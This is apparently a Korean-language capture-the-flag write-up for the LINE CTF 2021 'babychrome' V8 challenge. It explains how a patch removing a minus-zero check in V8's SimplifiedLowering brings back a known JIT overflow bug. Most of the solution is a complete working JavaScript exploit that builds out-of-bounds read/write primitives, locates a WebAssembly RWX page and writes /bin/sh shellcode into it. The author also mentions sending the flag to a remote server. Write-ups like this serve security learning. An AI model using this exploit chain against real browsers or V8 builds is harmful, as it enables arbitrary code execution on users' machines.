---
layout: post
title: "[LINE CTF 2021] babychrome Write-up"
image: /img/line_ctf.png
tags: [CTF, write-up, pwnable, browser, chrome, v8]
---

# babychrome

V8 문제입니다.

## Description

**PWN / 347 points (32 solves)**

<center><img src="/img/202103/babychrome_0.png" alt="description" width="300px"/></center>

문제에는 컴파일 된 d8 바이너리와 커스텀 패치 정보(overflow.patch), revision 커밋 해시가 주어집니다.

**overflow.patch :**

```
diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.cc
index da7d0b0fde..f91eea1693 100644
--- a/src/compiler/simplified-lowering.cc
+++ b/src/compiler/simplified-lowering.cc
@@ -186,12 +186,12 @@ bool CanOverflowSigned32(const Operator* op, Type left, Type right,
   // We assume the inputs are checked Signed32 (or known statically to be
   // Signed32). Technically, the inputs could also be minus zero, which we treat
   // as 0 for the purpose of this function.
-  if (left.Maybe(Type::MinusZero())) {
-    left = Type::Union(left, type_cache->kSingletonZero, type_zone);
-  }
-  if (right.Maybe(Type::MinusZero())) {
-    right = Type::Union(right, type_cache->kSingletonZero, type_zone);
-  }
+//  if (left.Maybe(Type::MinusZero())) {
+//    left = Type::Union(left, type_cache->kSingletonZero, type_zone);
+//  }
+//  if (right.Maybe(Type::MinusZero())) {
+//    right = Type::Union(right, type_cache->kSingletonZero, type_zone);
+//  }
   left = Type::Intersect(left, Type::Signed32(), type_zone);
   right = Type::Intersect(right, Type::Signed32(), type_zone);
   if (left.IsNone() || right.IsNone()) return false;
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index fe68106a55..90f2810140 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -2417,7 +2417,7 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
   global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
-  global_template->Set(isolate, "version",
+/*  global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));

   global_template->Set(isolate, "print", FunctionTemplate::New(isolate, Print));
@@ -2462,7 +2462,7 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
                          Shell::CreateAsyncHookTemplate(isolate));
   }

-  return global_template;
+*/  return global_template;
 }

 Local<ObjectTemplate> Shell::CreateOSTemplate(Isolate* isolate) {
```

**REVISION :**

```
c126700cbc1f7391b8b717f7c54b4f9537355db7
```

## Vuln

패치 내용의 핵심은 190~195 라인에 대한 주석 처리 입니다.  
주어진 커밋 해시를 이용해서 소스코드를 확인해보면 원본의 코드를 [simplified-lowering.cc#L190](https://github.com/v8/v8/blob/c126700cbc1f7391b8b717f7c54b4f9537355db7/src/compiler/simplified-lowering.cc#L190){:target="\_blank"} 여기서 확인할 수 있습니다.

**주석 처리 된 코드 :**

```cpp
if (left.Maybe(Type::MinusZero())) {
  left = Type::Union(left, type_cache->kSingletonZero, type_zone);
}
if (right.Maybe(Type::MinusZero())) {
  right = Type::Union(right, type_cache->kSingletonZero, type_zone);
}
```

그렇다면 이 코드는 언제 추가 됐을까요?  
[이 코드에 대한 git blame](https://github.com/v8/v8/blame/c126700cbc1f7391b8b717f7c54b4f9537355db7/src/compiler/simplified-lowering.cc#L190){:target="\_blank"}을 통해서 확인할 수 있고, "[[compiler] Fix bug in SimplifiedLowering's overflow computation](https://github.com/v8/v8/commit/e371325bcb03f20a362ebfa48225159702c6fde7){:target="\_blank"}"라는 커밋에서 추가된 코드임을 알 수 있습니다.

<center>
<figure>
<img src="/img/202103/babychrome_1.png" alt="git blame" />
<figcaption>▲ git blame 확인</figcaption>
</figure>
</center>

<center>
<figure>
<img src="/img/202103/babychrome_2.png" alt="commit" />
<figcaption>▲ commit message</figcaption>
</figure>
</center>

해당 코드는 기존의 버그를 고치기 위해 따로 추가된 코드였고 버그의 내용은 JIT Compiler 최적화 단계중 하나인 SimplifiedLowering 에서 발생하는 overflow 였습니다.  
패치 내용만 보고 버그를 트리거 시키는 js 파일을 만들기는 어렵지만, bug fix 의 경우에는 해당 버그가 사라졌는지 확인하기 위한 regress 파일이 test case 로 추가되는 경우가 많습니다. 이 커밋에도 [regress-1126249.js](https://github.com/v8/v8/commit/e371325bcb03f20a362ebfa48225159702c6fde7#diff-20934a25fd3317faff10fcce1a60090990f6cd124ad57d284d99a6be98889ddd){:target="\_blank"} 파일이 추가되어 있습니다.

<center>
<figure>
<img src="/img/202103/babychrome_3.png" alt="regress" />
<figcaption>▲ regress-1126249.js</figcaption>
</figure>
</center>

또한 커밋 내용중 `Bug: chromium:1126249`가 적혀있는 것을 보고 bugs.chromium.org 에서 [Issue 1126249](https://bugs.chromium.org/p/chromium/issues/detail?id=1126249){:target="\_blank"} 정보도 찾아볼 수 있습니다. 버그 리포팅도 해당 버그를 재현할 수 있는 샘플 파일을 첨부하는 경우가 많은데, 이 버그 역시 [sample.js](https://bugs.chromium.org/p/chromium/issues/attachmentText?aid=465645){:target="\_blank"} 파일이 첨부되어 있습니다.

regress 파일과 sample 파일을 통해 버그를 트리거 시킬 수 있는 코드를 쉽게 작성할 수 있고, 이를 변형해가며 안정적인 OOB를 일으킬 수 있는 코드를 작성해야 합니다.

## Solution

`let x = -0; let y = -0x80000000;` 일때, `x - y`가 JIT Compiler 최적화를 거치면 IN32 범위를 넘어가게 되는 overflow 가 발생합니다.  
이를 이용해서 최적화 단계에서 계산되는 node의 range와 실제 가지게 되는 value가 달라지도록 만들 수 있습니다.  
잘못 계산된 range를 가진 node로 Array를 생성하여 OOB read/write를 할 수 있습니다.


```js
let CONVERSION = new ArrayBuffer(8);
let CONVERSION_U32 = new Uint32Array(CONVERSION);
let CONVERSION_F64 = new Float64Array(CONVERSION);

let ab = new ArrayBuffer(100);
let wasm_bytes = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 2, 96, 1, 127, 0, 96, 0, 0, 2, 25, 1, 7, 105, 109, 112, 111, 114, 116, 115, 13, 105, 109, 112, 111, 114, 116, 101, 100, 95, 102, 117, 110, 99, 0, 0, 3, 2, 1, 1, 7, 17, 1, 13, 101, 120, 112, 111, 114, 116, 101, 100, 95, 102, 117, 110, 99, 0, 1, 10, 8, 1, 6, 0, 65, 42, 16, 0, 11]);

let wasm_inst = new WebAssembly.Instance(new WebAssembly.Module(wasm_bytes), {
  imports: {
    imported_func: function (x) {
      return x;
    },
  },
});

let wf = wasm_inst.exports.exported_func;

function tohex64(x) {
  return (
    "0x" +
    x[1].toString(16).padStart(8, "0") +
    x[0].toString(16).padStart(8, "0")
  );
}

function u32_to_f64(u) {
  CONVERSION_U32[0] = u[0];
  CONVERSION_U32[1] = u[1];
  return CONVERSION_F64[0];
}

function f64_to_u32(f, b = 0) {
  CONVERSION_F64[0] = f;
  if (b) return CONVERSION_U32;
  return new Uint32Array(CONVERSION_U32);
}

function print(s) {
  console.log(s);
}

function gc() {
  for (let i = 0; i < 0x10; i++) new ArrayBuffer(0x800000);
}

function trigger(a) {
  let minusZero = -0;
  let p = -0x80000000;

  if (a) {
    minusZero = -1;
    p = 1;
  }

  p = minusZero - p;
  p = p + 0;
  p = Math.max(-4, p);
  p = -p;
  p += 1;
  p = Math.max(p, 1);
  p += 1;
  p >>= 1;
  p -= 2;

  let arr = Array(p);
  let arr_two = [1.1, 2.2, 3.3];
  arr.pop();

  return [arr.length, arr, arr_two];
}

function pwn() {
  for (let i = 0; i < 0x10000; i++) {
    trigger(true);
  }

  gc();

  let a = trigger(false);
  let o = a[1];
  let corrupted_arr = a[2];

  let c = [0.1, 0.2, 0.3, 0.4, 0.5];
  let d = [wf, wf, wf, wf, wf];
  let e = [0.1, 0.2, 0.3, 0.4, 0.5];

  o[16] = 0x100000;

  let ci = 16;
  let di = 29;
  let ei = 41;

  c_elem = [f64_to_u32(corrupted_arr[ci])[1], 0];
  d_elem = [f64_to_u32(corrupted_arr[di])[0], 0];
  e_elem = [f64_to_u32(corrupted_arr[ei])[1], 0];

  print("c_elem addr : " + tohex64(c_elem));
  print("d_elem addr : " + tohex64(d_elem));
  print("e_elem addr : " + tohex64(e_elem));

  corrupted_arr[ci] = u32_to_f64([0, d_elem[0]]);

  function addrOf(o) {
    d[0] = o;
    return [f64_to_u32(c[0])[0], 0];
  }

  function read32(o) {
    o[0] |= 1;
    corrupted_arr[ei] = u32_to_f64([o[0] - 8, o[0] - 8]);
    return [f64_to_u32(e[0])[0], 0];
  }

  function read64(o) {
    o[0] |= 1;
    corrupted_arr[ei] = u32_to_f64([o[0] - 8, o[0] - 8]);
    return f64_to_u32(e[0]);
  }

  function write64(o, v) {
    o[0] |= 1;
    corrupted_arr[ei] = u32_to_f64([o[0] - 8, o[0] - 8]);
    e[0] = u32_to_f64(v);
  }

  wasm_addr = addrOf(wf);
  print("wasm addr : " + tohex64(wasm_addr));

  wasm_addr[0] += 12;
  tmp = read32(wasm_addr);
  print("SharedFunctionInfo addr : " + tohex64(tmp));

  tmp[0] += 4;
  tmp = read32(tmp);
  print("WasmExportedFunctionData addr : " + tohex64(tmp));

  tmp[0] += 8;
  tmp = read32(tmp);
  print("WasmInstanceObject addr : " + tohex64(tmp));

  tmp[0] += 0x68;
  tmp = read64(tmp);
  print("rwx addr : " + tohex64(tmp));

  let rwx_addr = tmp;
  let sc = [0xb848686a, 0x6e69622f, 0x732f2f2f, 0xe7894850, 0x1697268, 0x24348101, 0x1010101, 0x6a56f631, 0x1485e08, 0x894856e6, 0x6ad231e6, 0x50f583b];

  let ab_addr = addrOf(ab);
  print("ArrayBuffer addr : " + tohex64(ab_addr));

  let ab_back = ab_addr;
  ab_back[0] += 16 + 4;

  write64(ab_back, rwx_addr);

  let uu = new Uint32Array(ab);

  for (i = 0; i < sc.length; i++) {
    uu[i] = sc[i];
  }

  wf();
}

pwn();
```

<center>
<img src="/img/202103/babychrome_4.png" alt="challenge" />
</center>

<center>
<img src="/img/202103/babychrome_5.png" alt="flag" />
</center>

stdout,stderr 이 `/dev/null` 로 매핑되기 때문에 flag 파일을 읽어서 원격의 제 서버로 전송하게 했습니다.  

## 후기

git blame과 chromium bugs monorail을 이용해서 취약점 트리거까지는 금방 할 수 있었습니다.  
하지만 그 이후에 취약점을 유용한 OOB 코드로 변형 시키는데 실패해서 결국 대회 시간 안에는 풀지 못했습니다.  
다양한 버그를 많이 공부해야 할 것 같습니다.  
  
다음엔 대회 시간 안에 풀고 인증 하겠습니다.  